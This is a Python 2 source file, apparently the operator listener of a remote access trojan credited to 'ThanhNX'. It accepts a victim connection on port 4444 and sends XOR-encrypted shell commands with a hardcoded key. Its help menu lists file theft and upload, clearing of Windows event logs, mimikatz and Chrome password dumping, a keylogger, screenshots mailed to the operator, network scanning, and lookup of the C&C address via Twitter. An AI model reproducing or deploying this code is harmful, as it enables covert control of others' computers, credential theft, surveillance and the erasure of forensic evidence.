import socket
import json
from XOR_Encryption import *
import base64

#IP_ADDR = "192.168.254.129"
PORT = 4444
key = "WHAkyI=g0>%Z!\uS}Thk%^]T#xMeoCMU81ktDZ1{tB4y{V]s;\,/!u&-XjX+|bHh{2:8)>Y5S6?y~C2,Cpc|lQ\|s;xLZ%H/f^+9ceNKA+hi:T]aADk9o&07SdIP3?yC,WR3^\knOZ[5Zket9!&<^AhHR?_7)z,dRA\jd^!#\[H~_&8C/U?Iy1]{J8-hq(aPI-v<Pdq)_\<]n8].<7cd2-=k/P^CRz30FIvUVW8o~uloem,h+,:mn(gLK~\{uupLF|O|;0La$dWh;ES4Ob]jQgw6&+l%t\3kgwbZg7$iY|%M0$26m};#^tdg\\!^SMUZ<U&5pyv:Q2}WgIueC?:&t#~C>y;8n^hE$\wm>YElKiP/QkH\y4+?yI_RFy=OkNs!BUF4d4CrUFg!%nfjt{1:f7_!zNJ!U-_Qn\/s<^2BZ^w%(:BbW#~&%_a$In(/BGe_ws)HZ%km9w_b}MY54to4X8s5IF(aO=P}>eguE$pxu_{c6aE3EIDu9QyT[.5|viHDflds!)USPIEpf.V:dJrD^.i0\,s\gR?rI1W>Q-Bd5)=Mp0/^_rg.(D}HOPVxR2Yx~m{e%dBL%6KGBn4c&]N6h$>CP;u&(+{X1v{3W&YJRN)Z6$.~a#mo[Bf\8$!OMbqVG_[9L>(U?R/ZD{/>9YYdK,i(Tw{CV{JMBVyf4vVu&[cE6/{yN:,og2>o#p,[k65SZ$9>X=9Yq-W}A\C$!C4p.g0<Mx>0E1^Qzm\E=Ncd:Zw.I5ZN5H\S#$I$Dsoq0d_BW7QN0f3CNw:%|51%9_.n5v0Lf],5&!l~#(]VlO<j?rA4]?Y{MiHXcY&4tgIoxTNv}CnKM&H2~(.hmTqn.YAo,dzwQKCBN-;/8=:u6jby[a?,omVr7u:4HTg46cl)jT/&q+hSV8hGQBh^;O7f\B&n=OXLYh<%zyP2gs0zI/z!;NPoQ3QdPp,E#~/Qatb8XUsS-RHr|PLX#V\!I,1\+$i#):RRlQhq$:q}u0j\#UqmJP<5Dz0{P4i/xoaC:DGJN[=V"


class Listener:
    def __init__(self, ip, port):
        self.KEY = key
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # initialize a socket
        s.bind((IP_ADDR, PORT))  # Define a socket with IP address and
        s.listen(3)  # listening single connection
        print "[+] Listening incomming connection from " + IP_ADDR + ":" + str(PORT)
        self.conn, addr = s.accept()  # accept connection from client
        print "[+] Connected by " + str(addr[0]) + ":" + str(addr[1])

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.conn.recv(4096)
                return json.loads(json_data)
            except ValueError:
                continue

    # def transfer(self, conn, command):
    #
    #     encrypt_data = list()
    #     for i in command:  # the command is "json" format
    #         encrypt_data.append(str_xor(i, self.KEY))  # encrypt data by: encrypt_data=str_xor(data,key)
    #     self.reliable_send(encrypt_data)
    #     f = open(command[1], 'wb')
    #     while True:
    #         decrypt_data = str_xor(self.reliable_receive(),
    #                                self.KEY)  # decrypt data by: decrypt_data=str_xor(encrypt_data,key)
    #         print(decrypt_data)
    #         if 'Unable to find out the file' in decrypt_data:
    #             print '[-] Unable to find out the file'
    #             break
    #         if decrypt_data.endswith('DONE'):
    #             print '[+] Transfer completed '
    #             f.close()
    #             break
    #         f.write(decrypt_data)
    def help(self):
        print "**********Created by ThanhNX**************"
        print "[*] cd- change directory --Syntax: cd <path>"
        print "[*] grab- read a file on client --Syntax: grab <path_file>"
        print "[*] drop- write a file to client from server --Syntax: drop <path_file>"
        print "[*] unzip- unzip a .zip file --Syntax:  unzip <path_to_zip_file> <directory_to_extract_to>>"
        print "[*] cleartracking- clear Application log, System Log, Security Log, Setup Log\nSyntax: cleartracking"
        print "[*] search- search all file with path file and format file then send to your mail\nSyntax: search <path>*<formatfile>"
        print "[*] scan- scan a range network using Nmap\nRequirement: The target must be installed Nmap\nSyntax: scan <range> <port>"
        print "[*] mimikatz- using mimikatz to dump password\nPath mimikatz: C:\mimikatz_trunk\x64\mimikatz.exe\nSyntax: mimikatz"
        print "[*] screenshot- screenshot the target and send to your mail -- Syntax: screenshot"
        print "[*] download- download file with link  http download and create a file name --Syntax: download <http_link> <file_name>"
        print "[*] dumpPass- dump saved password on chrome browser --Syntax: dumpPass"
        print "[*] keylogger- listening press keybroad on the target --Syntax: keylogger"
        print "[*] tweetgrabber- crawling C&C IP from a twitter account \n" \
              "Requirement:  The target must be had chromedriver.exe\n" \
              "Path:C:\Users\chromedriver_win32\chromedriver.exe\n" \
              "--Syntax: tweetgrabber"

    def excute_remote(self):
        while True:
            command = raw_input("Shell> ")
            command = command.split(" ")
            if 'break' in command:
                encrypt_data = str_xor('break', self.KEY)
                self.reliable_send(encrypt_data)
                self.conn.close()
                break
            elif 'take' in command:
                self.transfer(self.conn, command)
            else:
                encrypt_data = list()
                if 'tweetgrabber' in command:
                    print "[!] Crawling from tweet....."
                elif 'keylogger' in command:
                    print "[!] Listing from client...."
                elif '-help' in command:
                    self.help()
                for i in command:  # the command is "json" format
                    encrypt_data.append(str_xor(i, self.KEY))  # encrypt data by: encrypt_data=str_xor(data,key)
                self.reliable_send(encrypt_data)
                decrypt_data = str_xor(self.reliable_receive(),
                                       self.KEY)  # decrypt data by: decrypt_data=str_xor(encrypt_data,key)
                print(decrypt_data)

    def main(self):
        self.excute_remote()


if __name__ == '__main__':
    print "**********Created by ThanhNX**************"
    print "Press <-help> to get more information...."
    IP_ADDR = raw_input("Input server address > ")
    Listener(IP_ADDR, PORT).main()
